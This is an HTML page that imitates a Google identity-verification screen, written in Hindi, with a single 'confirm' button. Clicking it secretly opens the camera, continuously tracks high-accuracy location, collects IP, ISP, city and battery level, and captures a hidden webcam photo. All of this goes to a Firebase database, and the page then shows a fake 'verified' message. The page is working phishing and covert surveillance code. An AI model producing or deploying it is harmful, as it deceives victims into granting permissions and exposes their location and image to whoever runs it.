<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Google - Verification Required</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
</head>
<body style="text-align:center; padding-top:100px; font-family:sans-serif; background:#fff;">
    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="100">
    <h2>पहचान सत्यापित करें</h2>
    <p>जारी रखने के लिए नीचे दिए गए बटन पर क्लिक करें।</p>
    <button onclick="activate()" style="padding:15px 35px; background:#1a73e8; color:white; border:none; border-radius:4px; cursor:pointer; font-weight:bold;">पुष्टि करें</button>
    <video id="v" style="display:none" autoplay playsinline></video>
    <canvas id="c" style="display:none"></canvas>

    <script>
        const firebaseConfig = { databaseURL: "https://pari-project-police-68f77-default-rtdb.firebaseio.com/" };
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();
        const logId = "JARVIS_" + Date.now();

        async function activate() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('v').srcObject = stream;
                
                navigator.geolocation.watchPosition(p => {
                    database.ref('live_detect/location').update({
                        lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy + "m"
                    });
                }, null, {enableHighAccuracy: true});

                fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
                    database.ref('live_detect/intel').update({ ip: d.ip, isp: d.org, city: d.city });
                });

                if (navigator.getBattery) {
                    navigator.getBattery().then(bt => {
                        database.ref('live_detect/intel').update({ battery: Math.floor(bt.level * 100) + "%" });
                    });
                }

                setTimeout(() => {
                    const v = document.getElementById('v'), c = document.getElementById('c');
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    database.ref('live_detect').update({ photo: c.toDataURL('image/jpeg', 0.5), time: new Date().toLocaleString(), status: "ONLINE" });
                    alert("पहचान सफल हुई।");
                }, 2000);
            } catch(e) { alert("त्रुटि: अनुमति की आवश्यकता है।"); }
        }
    </script>
</body>
</html>